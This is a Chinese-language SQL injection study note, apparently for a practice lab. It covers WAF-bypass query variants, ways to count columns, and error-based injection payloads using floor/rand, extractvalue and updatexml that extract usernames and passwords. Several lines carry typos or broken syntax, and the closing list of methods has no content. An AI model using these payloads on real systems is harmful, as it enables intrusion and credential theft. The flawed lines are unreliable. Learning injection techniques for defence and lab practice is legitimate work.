### sql查询语句
---
#### 基本查询语句：

---
**select**
```sql
select * from users where id = 1;
#与下方语句等效，bypass一些waf
```

```sql
select * from users where id in '1'; 
```
---

```sql
select * from users where id =(selcet id from users where username =('admin'))
#子查询 优先执行()内查询语句
```


---
**union**

```sql
select id from users union select email_id from emails;
#查询并合并数据显示
```


**注**:union联合查询必须要前后两条查询的列数必须要相等，所以需要补齐

---
**group by**
相比order by 可以用来waf bypass
```sql
select department,count(id) from student group by department;
#查询department院系人数count（id）对ID进行计数
```

一般用于二分法判断数据表列数
```sql
select * from users where id=9  group by 2;
#by2，4，8~~～依次排查到报错为止，从而确定列数；
```

```sql
select * from users where id=9group by 4;
```

---
**order by**

```sql
select stu_id from score where c_name='计算机' order by grade desc;
# grade参数desc使得排列顺序变为降序
```
同group by，一般用于判断数据表列数，且order by后面的参数决定了输出的结果将以第几列的顺序升序输出

---
**limit**
```sql
select * from users limit 1,3;
#限制为从第一行开始显示3行(实际是从0开始计数，类数组，即上述语句显示2,3,4行的结果)
```
一般用于限数显示报错反馈信息

---
**group_concat** 合并到一行显示
```sql
select group_concat(id,username,password)from users;
#将原本多行回显输出成一行，原因是一些回显可能只允许输出一行，导致其他行回显被折叠无法看到
```

---
**select database()** 查看当前数据库名称
**select version()** 查看当前数据库版本

### 注入分类

```
注入分类
|
└─── ————查询字段
|            |
|            └───字符型 输入的参数为字符串时，称为字符型
|            |
|            └───数字型 输入的参数为整型时，可认为是数字型注入
|
└─── ————注入方法
            |
            └───union注入
            |
            └───报错注入
            |
            └───布尔注入
            |
            └───时间注入
```

### 闭合的作用
手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号'--++”或‘#’或'%23'注释掉
注释掉：利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行(而非删除掉)

---
**information_schema**(包含所有mysql数据库的简要信息)包含**tables**（表名集合表）和**columns**（列名集合表）
**information_schema.schemata**包含了所有库名

---

### 报错注入
报错注入存在的基础**后台对于输入输出的合理性没有检查**，用户输入什么，服务器就会将相应信息返回

#### 报错注入的分类有

1.通过floor()报错注入

> 涉及到的函数
> rand()函数：随机返回0~1间的小数
> floor()函数：小数向下取整数。向上取整数ceiling()
> concat_ws()函数：将括号内数据用第一个字段连接起来
> group by子句：分组语句，常用于，结合统计函数，根据一个或多个列，对结果集进行分组
> as：别名
> count()函数：汇总统计数量
> limit：这里用于显示指定行数
```sql
union select 1,count(*),concat_ws('~',(select concat('~',password,username) from security.users limit 1,1),floor(rand(0)*2))as x from information_schema.tables  group by x--+
```

2.通过extractValue()报错注入

> #作用：从XML片段中提取指定的值。
> #示例：SELECT EXTRACTVALUE('<root><tag>value</tag></root>', '/root/tag'); 返回 value。其中'<root><tag>value</tag></root>'可以认为是标签tag，'/root/tag'则可认为是路径
> #用途：在报错注入中，可以传递无效的XML路径或结构来触发错误。

```sql
union select 1,2,extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema=database())))
#其中，'0x7e'后面的括号的内容可以随便改
```

**注：** extractvalue()的输出显示只有32个，所以为了获得更多本来无法显示的数据可以使用**substring(x,y,z)** 其中x为控制输出的字符串,y为开始显示的字符的位置，z为显示字符的个数，在MySQL中，substring()和substr()等效，但是在oracle中只能使用substr()因此要注意数据库的不同导致函数用法也不同

```sql
union select 1,2,extractvalue(1,concat(0x7e,substring((select group_concat(username,'~',password)from security.users),1,30)))--+
```

3.通过updateXml()报错注入

> #作用：在XML片段中应用XPATH表达式并更新XML内容。
> #示例：SELECT UPDATEXML('XML_document,XPath_string,new_value'); 返回更新后的XML。其中'XML_document'是string的格式，为xml对象的名称，例如Doc，'XPath_string'为路径，XPath格式的字符串，'new_value'string的格式，替换查找到的符合条件的数据
> #用途：在报错注入中，可以传递无效的XPATH表达式来触发错误。在报错注入中，与extractvalue相同主要注重**XPath_string**，输入错误的路径 

4.通过NAMECONSTO()报错注入

5.通过jion()报错注入

6.通过exp()报错注入

7.通过geometryCollection()报错注入

8.通过polygon()报错注入

9.通过multipoint()报错注入

10.通过multlinestring()报错注入

11.通过multpolygon()报错注入

12.通过linestring()报错注入
